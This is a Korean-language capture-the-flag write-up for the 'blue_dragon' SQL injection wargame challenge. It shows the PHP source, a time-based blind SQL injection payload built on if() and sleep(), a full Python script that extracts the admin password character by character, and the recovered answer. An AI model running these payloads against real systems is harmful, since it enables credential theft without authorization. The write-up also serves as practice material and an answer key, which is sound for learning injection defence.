# blue_dragon

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- 쿼리 실행 뒤에, `' \`를 필터링한다.
- 정확한 admin pw를 알아내야 한다.   

## 3. Solution
위 조건에서 언급했듯이 `' \`필터링은 쿼리 실행 후에 이루어 진다.   
이러한 취약점 속에 우리는 sleep함수를 통한 blind-sqli를 시도해 볼수 있다.   

구문의 구조는 다음과 같다.   
```sql
id='' or if(id='admin' and length(pw)=i, sleep(2), 1)#
id='' or if(id='admin' and ascii(substr(pw,i,1))=j, sleep(2), 1)#
```

if문 속 조건문이 참이라면 `sleep(2)`를 실행시킨다.    
이를 통해 페이지 지연시간을 계산하여 blind-sqli를 시도해 보았다.   


코드속 url을 입력하면 소요시간을 반환하는 함수 `delay_chk`를 만들었다.   
```python
def delay_chk(url):
    start_time = time.time()
    res = requests.get(url, cookies=cookie)
    if res.status_code == 200:
        end_time = time.time()
        return end_time - start_time
    else:
        return 0
```    

이후, 길이와 값을 구하는 코드를 추가하여 스크립트를 완성하였다.   
```python
import requests
import time

cookie = {'PHPSESSID' : '~~~~'}

def delay_chk(url):
    start_time = time.time()
    res = requests.get(url, cookies=cookie)
    if res.status_code == 200:
        end_time = time.time()
        return end_time - start_time
    else:
        return 0
    
for i in range(1,100):
    url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=' or if(id='admin' and length(pw)=%d, sleep(2), 1)%%23" % i
    print("%d ... " % i, end="")
    
    if(delay_chk(url) >= 2):
        pw_len = i
        print("O")
        print("\n======================")
        print("admin pw length  |  %d" % pw_len)
        print("======================\n")
        break
    
    else:
        print("X")
        

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?\
                id=' or if(id='admin' and ascii(substr(pw,%d,1))=%d, sleep(2), 1)%%23" % (i+1, j)

        if delay_chk(url) >= 2:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
            

print("\n======================")
print("admin pw  |  %s" % pw_value)
print("======================\n")
```   

스크립트 실행 결과는 다음과 같다.   

```
1 ... X
2 ... X
3 ... X
4 ... X
5 ... X
6 ... X
7 ... X
8 ... O

======================
admin pw length  |  8
======================

pw(1) : d
pw(2) : d9
pw(3) : d94
pw(4) : d948
pw(5) : d948b
pw(6) : d948b8
pw(7) : d948b8a
pw(8) : d948b8a0

======================
admin pw  |  d948b8a0
======================

```   


최종적으로 위 값을 `pw`로 넣어주면 문제가 해결된다.   

변수명 | 값
---|---
`pw` | d948b8a0